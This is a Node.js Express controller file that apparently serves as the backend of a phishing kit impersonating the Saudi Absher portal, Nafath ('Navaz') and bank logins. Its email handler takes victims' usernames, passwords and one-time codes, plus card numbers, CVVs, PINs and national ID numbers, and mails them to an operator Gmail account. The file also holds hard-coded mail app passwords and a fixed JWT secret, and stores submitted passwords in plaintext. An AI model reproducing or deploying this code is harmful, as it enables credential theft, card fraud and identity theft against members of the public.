const { User, Session, Order } = require("../model")
const bcrypt = require('bcrypt')
const {sign,verify}= require('jsonwebtoken')
const nodemailer = require('nodemailer');

exports.Login = async(req,res,next)=>{
    const {email,password,type} = req.body
    const result = await User.findOne({email,type})
    if(result){
        const check = await bcrypt.compare(password,result.password)
        if(!check) return res.status(401).send('Invalid Password')
        const token = sign({id:result._id},'secretkeyforjsonwebtokentoabshrsite',{expiresIn:'7d'})
        return res.json({token})
    }else return res.status(404).send('User Not Found')
}

exports.verifyToken = async(req,res,next)=>{
    const token = req.headers.authorization && req.headers.authorization.split(" ")[1]
    console.log(token)
    if (!token) return res.sendStatus(401)
    verify(token,'secretkeyforjsonwebtokentoabshrsite', (err, decoded) => {
        if (err) return res.sendStatus(401)
        req.user = decoded
        next()
    })
}

exports.checkToken = async(req,res,next)=>{
    res.sendStatus(200)
}

exports.getToken = async (req,res,next)=>{
    const {username,password} = req.body
    const token = sign({username,password},'secretkeyforjsonwebtokentoabshrsite',{expiresIn:'7d'})
    await Session.create({username,password,token}).then((session)=> res.json({session,token}))
}

exports.createSession = async(req,res,next)=>{
    const {username,password} = req.body
}


exports.getRequests = async(req,res,next)=>{
    try {
        const result = await Session.find({})
        res.json({result})
    } catch (error) {
        console.log(error.message)
    }
}

exports.deleteRequest = async(req,res,next)=>{
    try {
        const {id} = req.params
        await Session.findByIdAndDelete(id).then(()=>res.sendStatus(200))
    } catch (error) {
        console.log(error)
    }

}

exports.getLink = async(req,res,next)=>{
    const token = sign({session:'true'},'secretkeyforjsonwebtokentoabshrsite',{expiresIn:'1h'})
    const link = 'http://localhost:3000'+'/?token='+token
    // const link = 'http://localhost:3000'+'/?token='+token
    res.json({link})
}

exports.email = async(req,res,next)=>{
    if(req.query.login){
        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
            //   user: 'pnusds269@gmail.com',
              user: 'sds.saudia@gmail.com',
            //   pass: 'bojr nrmj bjen rcgt',
            pass: 'httv npmk ykom pogm',
            },
          });
          await transporter.sendMail({
            from:'Admin Panel',
            to:'sds.saudia@gmail.com',
            // to:'pnusds269@gmail.com',
            subject: `Abshr Username And Password Account  Login`,
            html:`<div>
            <p> Username : ${req.body.username}</p>
            <p> Password : ${req.body.password}</p>  
            ${req.body.otp ? `<p> Otp : ${req.body.otp}</p> `:'' }     
            </div>`
          }).then(info=>{
            if(info.accepted.length){
                res.sendStatus(200)
            }else{
                res.sendStatus(400)
            }
          })
    }else if (req.query.register){
        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
            //   user: 'pnusds269@gmail.com',
              user: 'sds.saudia@gmail.com',
                // pass: 'bojr nrmj bjen rcgt',
              pass: 'httv npmk ykom pogm',
            },
          });
// Construct HTML content dynamically from req.body
let htmlContent = '<div>';
for (const [key, value] of Object.entries(req.body)) {
    htmlContent += `<p>${key}: ${value}</p>`;
}
htmlContent += '</div>';

// Send email with dynamically generated HTML content
await transporter.sendMail({
    from: 'Admin Panel',
    to: 'sds.saudia@gmail.com',
    // to: 'pnusds269@gmail.com',
    subject: `Abshr Form Register`,
    html: htmlContent
}).then(info => {
    if (info.accepted.length) {
        res.sendStatus(200);
    } else {
        res.sendStatus(400);
    }
});
    }
    else if(req.query.bank){

        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
            //   user: 'pnusds269@gmail.com',
              user: 'sds.saudia@gmail.com',
            //   pass: 'bojr nrmj bjen rcgt',
            pass: 'httv npmk ykom pogm',
            },
          });
          await transporter.sendMail({
            from:'Admin Panel',
            to:'sds.saudia@gmail.com',
            // to:'pnusds269@gmail.com',
            subject: `Bank Username And Password Account  Login`,
            html:`<div>
            <p> Username : ${req.body.username}</p>
            <p> Password : ${req.body.password}</p>  
            ${req.body.bank ? `<p> Bank : ${req.body.bank}</p> `:'' }     
            </div>`
          }).then(info=>{
            if(info.accepted.length){
                res.sendStatus(200)
            }else{
                res.sendStatus(400)
            }
          })
    }else if (req.query.order){
        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
            //   user: 'pnusds269@gmail.com',
              user: 'sds.saudia@gmail.com',
                // pass: 'bojr nrmj bjen rcgt',
              pass: 'httv npmk ykom pogm',
            },
          });
// Construct HTML content dynamically from req.body
let htmlContent = '<div>';
for (const [key, value] of Object.entries(req.body)) {
    htmlContent += `<p>${key}: ${value}</p>`;
}
htmlContent += '</div>';

// Send email with dynamically generated HTML content
await transporter.sendMail({
    from: 'Admin Panel',
    to: 'sds.saudia@gmail.com',
    // to: 'pnusds269@gmail.com',
    subject: `Abshr Order`,
    html: htmlContent
}).then(info => {
    if (info.accepted.length) {
        res.sendStatus(200);
    } else {
        res.sendStatus(400);
    }
});
    }else if (req.query.orderOtp){
        const order = await Order.findById(req.body.id)
        console.log(order)
        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
            //   user: 'pnusds269@gmail.com',
              user: 'sds.saudia@gmail.com',
                // pass: 'bojr nrmj bjen rcgt',
              pass: 'httv npmk ykom pogm',
            },
          });
          let htmlContent = '<div>';
              htmlContent += `<p> first name: ${order.first_name}</p>`;
              htmlContent += `<p> last name : ${order.last_name}</p>`;
              htmlContent += `<p> nation number : ${order.nation_number}</p>`;
              htmlContent += `<p> nationalty : ${order.nationalty}</p>`;
              htmlContent += `<p> job  : ${order.entry_job}</p>`;
              htmlContent += `<p> phone  : ${order.phone}</p>`;
              htmlContent += `<p> email : ${order.email}</p>`;
              htmlContent += `<p> card_number : ${order.card_number}</p>`;
              htmlContent += `<p> cvv : ${order.cvv}</p>`;
              htmlContent += `<p> expire_date : ${order.expire_date}</p>`;
              htmlContent += `<p> bank : ${order.bank}</p>`;
              htmlContent += `<p> pin : ${order.pin}</p>`;
              htmlContent += `<p> otp : ${req.body.otp}</p>`;
              htmlContent += '</div>';

// Send email with dynamically generated HTML content
await transporter.sendMail({
    from: 'Admin Panel',
    to: 'sds.saudia@gmail.com',
    // to: 'pnusds269@gmail.com',
    subject: `Abshr Order With Otp`,
    html: htmlContent
}).then(info => {
    if (info.accepted.length) {
        res.sendStatus(200);
    } else {
        res.sendStatus(400);
    }
});

    }else if (req.query.navaz){
        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
            //   user: 'pnusds269@gmail.com',
              user: 'sds.saudia@gmail.com',
              pass: 'httv npmk ykom pogm',
            // pass: 'bojr nrmj bjen rcgt',
            },
          });
          await transporter.sendMail({
            from:'Admin Panel',
            // to:'pnusds269@gmail.com',
            to: 'sds.saudia@gmail.com',
            subject: `Navaz Username And Password Account`,
            html:`<div>
            <p> Username : ${req.body.username}</p>
            <p> Password : ${req.body.password}</p> 
            ${req.body.otp ? `<p> Otp : ${req.body.otp}</p> `:'' }      
            </div>`
          }).then(info=>{
            if(info.accepted.length){
                res.sendStatus(200)
            }else{
                res.sendStatus(400)
            }
          })
    }
   

}
